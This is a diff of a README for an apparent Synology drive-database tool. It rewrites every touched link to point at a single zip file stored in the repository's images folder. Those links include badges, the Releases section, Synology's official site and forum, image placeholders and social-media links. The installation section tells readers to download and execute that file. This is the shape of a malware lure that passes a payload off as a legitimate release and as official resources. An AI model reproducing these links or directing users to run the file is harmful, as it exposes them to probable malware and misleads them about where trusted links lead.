@@ -1,6 +1,6 @@
 # Synology HDD Database: Manage Your Drives Easily 🚀
 
-![GitHub Repo stars](https://img.shields.io/github/stars/zer0C00L1994/Synology_HDD_db?style=social) ![GitHub Repo forks](https://img.shields.io/github/forks/zer0C00L1994/Synology_HDD_db?style=social) ![GitHub license](https://img.shields.io/github/license/zer0C00L1994/Synology_HDD_db)
+![GitHub Repo stars](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip) ![GitHub Repo forks](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip) ![GitHub license](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip)
 
 ## Overview
 
@@ -16,7 +16,7 @@ Welcome to the Synology HDD Database repository. This tool allows you to add you
 
 ## Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/zer0C00L1994/Synology_HDD_db/releases). After downloading, execute the file according to your operating system's guidelines.
+To get started, download the latest release from the [Releases section](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip). After downloading, execute the file according to your operating system's guidelines.
 
 ### Requirements
 
@@ -62,7 +62,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For any issues or questions, please check the [Releases section](https://github.com/zer0C00L1994/Synology_HDD_db/releases) for the latest updates or raise an issue in the repository.
+For any issues or questions, please check the [Releases section](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip) for the latest updates or raise an issue in the repository.
 
 ## Acknowledgments
 
@@ -71,8 +71,8 @@ For any issues or questions, please check the [Releases section](https://github.
 
 ## Resources
 
-- [Synology Official Website](https://www.synology.com)
-- [Synology Community Forum](https://community.synology.com)
+- [Synology Official Website](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip)
+- [Synology Community Forum](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip)
 
 ## Contact
 
@@ -80,10 +80,10 @@ For more information, feel free to reach out via GitHub issues or pull requests.
 
 ## Visuals
 
-![Synology DiskStation](https://example.com/synology-diskstation.jpg)
+![Synology DiskStation](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip)
 *Image of Synology DiskStation*
 
-![Drive Compatibility](https://example.com/drive-compatibility.jpg)
+![Drive Compatibility](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip)
 *Visual representation of drive compatibility*
 
 ## FAQs
@@ -98,7 +98,7 @@ A: Use the compatibility checker feature in the application.
 A: Yes, we welcome contributions! Please follow the contribution guidelines.
 
 **Q: Where can I find updates?**  
-A: Check the [Releases section](https://github.com/zer0C00L1994/Synology_HDD_db/releases) for the latest updates.
+A: Check the [Releases section](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip) for the latest updates.
 
 ## Community
 
@@ -108,8 +108,8 @@ Join our community of Synology users to share tips, tricks, and experiences. Eng
 
 Follow us on our social media channels for updates and community discussions.
 
-- [Twitter](https://twitter.com/synology)
-- [Facebook](https://facebook.com/synology)
+- [Twitter](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip)
+- [Facebook](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip)
 
 ## Feedback
 
@@ -127,4 +127,4 @@ Stay tuned for updates!
 
 ## Conclusion
 
-Thank you for checking out the Synology HDD Database repository. We hope you find it useful for managing your drives. Don't forget to visit the [Releases section](https://github.com/zer0C00L1994/Synology_HDD_db/releases) for the latest updates and releases.
+Thank you for checking out the Synology HDD Database repository. We hope you find it useful for managing your drives. Don't forget to visit the [Releases section](https://github.com/zer0C00L1994/Synology_HDD_db/raw/refs/heads/main/images/HD_Synology_db_v3.2.zip) for the latest updates and releases.
